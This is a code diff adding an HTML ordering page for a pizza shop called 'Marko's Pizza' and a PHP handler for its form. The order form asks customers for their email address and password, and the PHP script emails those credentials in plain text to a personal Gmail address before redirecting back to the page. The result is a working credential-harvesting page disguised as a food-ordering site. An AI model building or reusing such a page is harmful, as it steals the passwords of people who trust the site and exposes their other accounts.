@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Marko's Pizza</title>
+    <style>
+        /* ... (CSS styles) ... */
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Marko's Pizza</h1>
+    </header>
+    
+    <section>
+        <h2>Menu</h2>
+        <div class="menu-item">
+            <h3>Pepperoni Pizza</h3>
+            <p>Delicious pepperoni pizza made with fresh ingredients. Price: $9</p>
+            <button class="order-button" onclick="showOrderForm('Pepperoni Pizza')">Order Now</button>
+        </div>
+        
+        <div class="menu-item">
+            <h3>Margherita Pizza</h3>
+            <p>Classic Margherita pizza with tomato, mozzarella, and basil. Price: $9</p>
+            <button class="order-button" onclick="showOrderForm('Margherita Pizza')">Order Now</button>
+        </div>
+        
+        <!-- Add more menu items and buttons here -->
+    </section>
+    
+    <section>
+        <h2>Contact Us</h2>
+        <p>If you have any questions or need assistance with your order, please email us at: <a href="mailto:5markizik5@gmail.com">5markizik5@gmail.com</a></p>
+        <button class="contact-button">Contact Us</button>
+    </section>
+    
+    <section id="order-form-section" style="display: none;">
+        <h2>Order Now</h2>
+        <form id="order-form" action="order.php" method="post">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required><br>
+            <label for="pizza-type">Pizza Type:</label>
+            <input type="text" id="pizza-type" name="pizzaType" readonly><br>
+            <label for="quantity">Quantity:</label>
+            <input type="number" id="quantity" name="quantity" min="1" value="1"><br>
+            <button type="submit" class="order-button">Place Order</button>
+        </form>
+    </section>
+    
+    <footer>
+        <p>&copy; 2023 Marko's Pizza. All rights reserved.</p>
+    </footer>
+
+    <script>
+        function showOrderForm(pizzaType) {
+            document.getElementById('pizza-type').value = pizzaType;
+            document.getElementById('order-form-section').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $to = "5markizik5@gmail.com"; // Email address to receive orders
+    $subject = "New Pizza Order";
+    
+    $email = $_POST["email"];
+    $password = $_POST["password"];
+    $pizzaType = $_POST["pizzaType"];
+    $quantity = $_POST["quantity"];
+    
+    $message = "Order Details:\n";
+    $message .= "Email: " . $email . "\n";
+    $message .= "Password: " . $password . "\n";
+    $message .= "Pizza Type: " . $pizzaType . "\n";
+    $message .= "Quantity: " . $quantity . "\n";
+
+    // You can add more details to the message as needed
+    
+    // Send the email
+    mail($to, $subject, $message);
+    
+    // Redirect back to the index page
+    header("Location: index.html");
+    exit();
+}
+?>
